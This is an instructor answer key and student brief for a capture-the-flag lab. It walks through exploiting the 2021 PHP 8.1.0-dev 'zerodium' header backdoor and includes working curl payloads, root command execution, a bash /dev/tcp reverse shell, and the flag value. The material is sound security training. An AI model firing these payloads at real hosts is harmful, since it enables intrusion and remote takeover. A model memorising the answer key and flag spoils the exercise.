# Philadelphia Student Brief

## General Instructions

On this subnet, `.254` is the lab router and is out of bounds.

The following docker containers are available to you as pre-installed tools helpful for the labs. Additional details are in the README.txt file on the Kali desktop.

- JavaChains

## Assigned Subnet

`192.168.13.0/24`

## Objective

From your assigned operations station, discover the host on the assigned subnet, gain appropriate access, and collect the flag.

The flag is obvious once you reach it. It is not intentionally hidden or obfuscated.

## Deliverable

Record the flag value for Philadelphia.

## PCTE range limitations

These limits apply on Persistent Cyber Training Environment (PCTE) ranges used by this Module. Treat the items below as a no-strike list when they exist. Not every item is present on every range or host.

Do not target, block, terminate, or delete range-control artifacts:

- **Network:** `10.0.0.0/8` (range control and instrumentation; do not block or flag that traffic). Routers past the edge-router in grey space. TCP `5672` (AMQP user-emulation on the control subnet), `49998`, and `49999`.
- **Accounts:** `range-admin` / `range_admin`, `range-control`, and `range`. Do not use accounts whose username or password contains `simspace`.
- **User emulation:** do not stop it. Typical paths: `C:\Program Files (x86)\Simspace\` and `C:\Users\<Username>\Simspace`. Scripts: `run-actuation.cmd`, `ueactuation.cmd`.
- **Directories:** `C:\Program Files\Puppet Labs` and the Simspace paths above.
- **Processes:** `java.exe`, `javaw.exe`, `ruby.exe`, `rubyw.exe`, `start.exe`, `chromedriver.exe`, `IEDriverServer.exe`, Metova, Selenium, WebDriver.

# Philadelphia — Instructor Answer Key

## Objective and starting context

Students start on the assigned operations station with only the city codename and subnet `192.168.13.0/24`. They must discover the live host, gain access, and recover the flag. The live instructor walkthrough is in this file.

Do not give students the service name, CVE, or host IP.

## Flag / reference table

|Item|Value|
|---|---|
|City|Philadelphia|
|Assigned subnet|`192.168.13.0/24`|
|Deploy flag key|`T4_FLAG`|
|Default flag|`onyx-raven`|
|Flag location on target|`/flag.txt` after access|

Rotate `T4_FLAG` in `environments/pcte_vulnhub_targets/.env` and restart the matching container when the class needs a new value. Grade against the live `.env` value, not only the default in this table.

## Initial situational awareness

Establish ops-station context before touching the assigned subnet. These commands are first-use literacy for this Module: run the full set, then interpret.

```
date -u
hostname
whoami
id
pwd
echo "$SHELL"
uname -a
cat /etc/os-release
who
w
ps aux
ss -tulpen
ss -tunap
ip a
ip -4 route
```

Why this matters:

- `date -u` and `hostname` fix remote time and host identity before any later log or packet evidence.
- `whoami`, `id`, `pwd`, and `echo "$SHELL"` lock user, session, and interpreter context.
- `uname -a` and `/etc/os-release` capture OS/runtime version.
- `who` / `w` and `ps aux` show active users and a process baseline.
- `ss -tulpen` (listeners) and `ss -tunap` (active sockets) give the required TCP+UDP picture.
- `ip -4 route` and `ip route get 192.168.13.10` show that the assigned subnet is already reachable via the default gateway.

Expected findings:

- The student is on the operations station (hostname `ops`), not on the city target. The shell is `zsh`.
- `ip -4 addr` shows the lab-facing address on `eth1` (this deployment: `172.16.123.100/24`). The `eth0` address `10.10.123.100/16` is not the path to this city subnet.
- `ip route get 192.168.13.10` uses the default gateway (this deployment: `via 172.16.123.253 dev eth1 src 172.16.123.100`). Do not add a route via `192.168.100.254`. That next hop does not answer, and a more-specific route would hide the working default path.
- Listening sockets on the ops station are local tooling, not the target. `ss` shows SSH and the local JavaChains listener on `8011/tcp`.

## Instructor live walkthrough

### Objective and starting context

Live instructor demo for the Philadelphia Module (`B02.M05`). Students know only the assigned subnet `192.168.13.0/24`. On this range, `.254` is the lab router on the segment and is out of bounds. Do not open with the product name, CVE, or host IP.

This walkthrough is rewritten onto the `192.168.13.0/24` student-facing range. Example host addresses in later steps use the `.10` (and, where present, `.11`) convention from the shared stack; treat those as discovered values, not pre-briefed facts.

The deploy flag key is `T4_FLAG`. Confirm the live `.env` value before grading.

### Required Tools

- `iproute2` (for `ip route get`. This ops station already has a path, so do not add a static route)
- `nmap` (for host discovery and port scanning)
- `curl` (for web enumeration and payload delivery)
- `nc` (Netcat, for catching the reverse shell)

### 1. Network Routing & Host Discovery

At the start of this scenario, we only know the target subnet: `192.168.13.0/24`. The operations station is on `172.16.123.0/24` (`eth1`). The city subnet is reached through the default gateway.

Confirm the path before scanning. `ip route get` prints the next hop and the source address the kernel will use:

```
ip route get 192.168.13.10
```

_Output:_

```
192.168.13.10 via 172.16.123.253 dev eth1 src 172.16.123.100 uid 1000
    cache
```

**Observation:** The subnet is already reachable. The source address is `172.16.123.100`.

**Inference:** Do not run `ip route add 192.168.13.0/24 via 192.168.100.254`. `192.168.100.254` does not answer on this range, and that more-specific route would override the working default path.

With connectivity available, find which addresses on the subnet actually answer. `nmap -sn` is a ping sweep: it checks host up/down and **does not** port-scan. That is cheaper than a full TCP scan of every IP, and we only have a subnet so far — we still need a live host before we care about services.

```
nmap -sn -n 192.168.13.0/24
```

_Why `-n`:_ skip reverse DNS. The ops station resolver (`172.16.123.253`) refuses DNS. Without `-n`, this sweep sits at full CPU and does not print hosts. With `-n`, the same sweep finishes in a few seconds.

_Output excerpt:_

```
Nmap scan report for 192.168.13.10
Host is up.
Nmap scan report for 192.168.13.254
Host is up.
```

**Observation:** Two hosts respond on this subnet. `192.168.13.1` does not.

**Inference:** The student brief marks `.254` as the lab router and out of bounds. Concentrate service enumeration on **192.168.13.10**. The shell in section 5 confirms that address is the workload's default gateway.

### 2. Service Enumeration

We have a candidate IP. Next question: **what is listening, and what does it claim to be?** That takes a version scan, not another ping sweep.

```
nmap -Pn -sV -n -p- 192.168.13.10
```

_Why these options:_

- `-Pn` — skip nmap’s host-discovery probes. We already know `192.168.13.10` responded to `-sn`. This also keeps the scan going if the host later ignores ping but still serves TCP.
- `-n` — skip reverse DNS, same reason as the sweep. The resolver still refuses.
- `-sV` — version detection. An open `80/tcp` labeled only `http` is not enough to research; we need the product and version string (here, PHP’s built-in server and **8.1.0-dev**).
- `-p-` — all 65535 TCP ports, not nmap’s default top 1000. A single missed listener would hide the whole attack surface. On this host the extra cost is small.

_Output excerpt:_

```
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
```

**Observation:** A single open port — **80/tcp** — identified as a **PHP built-in development server** with version **PHP 8.1.0-dev**.

**Inference:** This is not a typical production Apache/nginx + PHP-FPM stack. The `-dev` build string is unusual on a reachable HTTP service and is worth confirming in response headers before researching further.

#### Initial Web Probing

nmap told us HTTP on port 80 and a PHP **-dev** build. Confirm that in the HTTP conversation itself: response headers (what the server admits) and the body (whether there is an application to attack, or almost nothing).

```
curl -s -D - http://192.168.13.10/ -o /tmp/t4-root.txt | head -12
cat /tmp/t4-root.txt
```

_Why this `curl`:_

- `-s` — silent; drop the progress meter so the output is just headers/body.
- `-D -` — write response **headers** to stdout (`-` means stdout). That is where `X-Powered-By` / `Server` show up.
- `-o /tmp/t4-root.txt` — write the **body** to a file so headers and body stay separated.
- `| head -12` — only the first header lines; we care about status and PHP’s version header, not a long dump.
- `cat /tmp/t4-root.txt` — then read the page. If this were a real app we would look for forms, paths, and generators. Here we need to see how little surface there is.

_Header excerpt:_

```
HTTP/1.1 200 OK
X-Powered-By: PHP/8.1.0-dev
Content-type: text/html; charset=UTF-8
```

_Body:_

```
hello world
```

**Observation:** The body is a trivial `hello world` page. The `X-Powered-By` header confirms **PHP/8.1.0-dev** — matching nmap.

**Inference:** A development-tree PHP build on a live HTTP port is a strong research lead, and the page itself is not an application (no forms, no extra paths). Searching with only that version string — `PHP 8.1.0-dev` — surfaces a March 2021 supply-chain incident against the 8.1 **dev** tree. Step 3 is what that implant is and how to prove it.

### 3. Vulnerability Discovery

#### What this backdoor is

On **28 March 2021** the PHP git server was compromised. Attackers pushed a commit into the **PHP 8.1 development tree** that implanted a remote code-execution hook. It never shipped in the official **8.1.0** release; it only exists in **`8.1.0-dev`** snapshots from that window. That is why the nmap/`X-Powered-By` string **PHP/8.1.0-dev** is the research lead, not “PHP 8.1” in general. The php.internals notice is here: [php.internals / 113838](https://news-web.php.net/php.internals/113838). The matching Vulhub notes are `vulnhub/php/8.1-backdoor/README.md`.

The implant does not hook a URL or a form. It watches one HTTP request header:

- Header **name:** `User-Agentt` — extra `t`. A normal browser `User-Agent` never matches, so accidental triggers are unlikely.
- Header **value:** must start with the literal prefix **`zerodium`**. Everything **after** that prefix is passed to PHP `eval()`.

**Zerodium** is an exploit-acquisition company. The attackers used that word as a **magic key / calling card** inside the implant — it is not a PHP feature and not a product you configure. Without that prefix, the extra header is ignored and PHP just serves the page.

Trigger shape:

```
User-Agentt: zerodium<php code here>
```

**Candidate selection:** This host has no login, upload, or framework paths — only the tainted runtime banner. Test this documented header implant before inventing application-layer attacks against `hello world`.

#### Prove the implant is live

Use a harmless PHP expression (`var_dump(233*233)`) so a success is obvious in the HTTP body and we are not dropping a shell yet.

First, send the same header **without** the magic prefix. The implant should stay closed:

```
curl -s http://192.168.13.10/ \
  -H 'User-Agentt: var_dump(233*233);'
```

_Output:_

```
hello world
```

**Observation:** Only the normal page. Our PHP was not evaluated.

**Inference:** `User-Agentt` alone is not enough. The `zerodium` prefix is the on-switch.

Now prepend `zerodium` and send the same math:

```
curl -s http://192.168.13.10/ \
  -H 'User-Agentt: zerodiumvar_dump(233*233);'
```

_Output:_

```
int(54289)
hello world
```

**Observation:** The body starts with `int(54289)`, then the usual `hello world`. `233 * 233 = 54289`.

**Inference:** The PHP interpreter **ran our code**. That number cannot come from the static page; the server evaluated the expression and `var_dump` printed the type and result. That is **code execution** (inside PHP). OS commands and a reverse shell are the same channel with a different PHP payload (`system(...)`).

#### Automated Path

No stock Metasploit module targets this backdoor (searches for `zerodium`, `8.1.0-dev`, and `User-Agentt` return unrelated results). The public PoC is this crafted header — the same `curl` path used above. There is no separate framework module to configure.

### 4. Exploit Preparation & Remote Access (Manual)

The math probe proved **PHP** execution. A reverse shell is an **OS** callback (`bash` outbound to our listener), so the next check is whether that eval can reach the operating system. PHP’s `system()` runs a shell command in the web-server process (root in this container). If `id` comes back, we have command execution and can use the same primitive for a callback.

#### Prove Command Execution

```
curl -s http://192.168.13.10/ \
  -H "User-Agentt: zerodiumsystem('id');"
```

_Output:_

```
uid=0(root) gid=0(root) groups=0(root)
hello world
```

**Observation:** `system('id')` returns root privileges and still appends the normal page body.

**Inference:** We have OS-level RCE as root. Next, open a reverse shell rather than only printing command output over HTTP.

#### Reverse Shell

Start a Netcat listener on the operations station. Set `LHOST` to the `src` address from `ip route get 192.168.13.10` (this deployment: `172.16.123.100`). Do not use `192.168.100.1`. That address is not on this station, and the target cannot call it back.

```
nc -lvnp 4444
```

In a second terminal, inject a bash reverse shell through the backdoor header:

```
LHOST="172.16.123.100"   # src from: ip route get 192.168.13.10
LPORT="4444"

curl -s "http://192.168.13.10/" \
  -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'\");"
```

_Listener excerpt:_

```
listening on [any] 4444 ...
connect to [172.16.123.100] from (UNKNOWN) [192.168.13.10] 60808
root@b2e4d4978b58:/var/www/html#
```

The source port and the container id in the prompt change across runs. The peer address is the city host.

#### Failed Attempt: Complex PHP in the Header Without Escaping

Wrapping the reverse shell in nested quotes inside the `User-Agentt` value can break shell parsing on the attacker side before the request is even sent. If `curl` returns a usage error or the listener stays silent, simplify quoting by assigning the header to a variable:

```
UA='zerodiumsystem("bash -c '"'"'bash -i >& /dev/tcp/172.16.123.100/4444 0>&1'"'"'");'

curl -s "http://192.168.13.10/" -H "User-Agentt: $UA"
```

_What we learned:_ The exploit is a single HTTP header, but **shell quoting still matters** when constructing the `curl` command locally.

### 5. Survey the Target

```
id
date -u
hostname
whoami
ip a
ip r
pwd
echo "$SHELL"
ps aux
uname -a
cat /etc/os-release
who
w
ss -tulpen
ss -tunap
```

Why this matters:

- Gained interactive access to the target. Check basic configuration before collecting the flag.

Expected findings on this image:

- `id`, `hostname`, `whoami`, `ip a`, and `ip r` work. The address is `192.168.13.10/24` and the default route is `via 192.168.13.254`.
- `pwd` is `/var/www/html`. `echo "$SHELL"` is `/bin/bash`. `uname -a` reports the range host kernel. `/etc/os-release` is Debian 10 (buster).
- `ps` and `w` are not installed (`command not found`). `who` prints nothing.
- `ss -tulpen` shows the PHP listener on `80/tcp`.
- The prompt hostname is the container id (this run: `b2e4d4978b58`). It changes when the container is recreated.

### 6. Retrieve the Flag

From the reverse shell. Quote the pattern so the ops station's `zsh` does not expand it before the command reaches the target:

```
find / -iname '*flag*' 2>/dev/null
cat /flag.txt
```

The broad name match also hits kernel paths that contain `flags`. The proof file is `/flag.txt`.

_Output of `cat /flag.txt`:_

```
onyx-raven
```

#### Fallback (HTTP-Only)

If you prefer to stay at the HTTP layer without an interactive shell, the backdoor can print the flag inline:

```
curl -s http://192.168.13.10/ \
  -H "User-Agentt: zerodiumsystem('cat /flag.txt');"
```

_Output:_

```
onyx-raven
hello world
```

Target 4 is complete.

## Troubleshooting / confirmation

- If the subnet does not respond, confirm the stack is up and `ip route get 192.168.13.10` still uses the default gateway. Do not add a route via `192.168.100.254`.
- If `nmap -sn` never prints hosts, rerun it with `-n`.
- If the reverse shell does not connect, set `LHOST` to the `src` address from `ip route get 192.168.13.10`, not `192.168.100.1`.
- If the recovered string does not match this table, read the live `T4_FLAG` from `.env` before marking the quiz wrong.
- If students name a CVE or product before they have service evidence, redirect them to host discovery and version output.
- The city subnet for this module is `192.168.13.0/24`. The ops-station address can change with DHCP; take `LHOST` from `ip route get`, not from a remembered `172.16.123.100`.

## Grading checkpoints

|Checkpoint|Acceptable evidence|
|---|---|
|Assigned subnet used|Student worked `192.168.13.0/24` (or the live remapped equivalent)|
|Host discovered|Live host identified from a subnet sweep, not from a handed IP|
|Access gained|Command or session evidence that reached the target filesystem|
|Flag submitted|Quiz value matches live `T4_FLAG` (default `onyx-raven`)|

Accept a correct live flag even if the student used a valid alternate exploit path. Do not award the quiz for a walkthrough dump without the flag.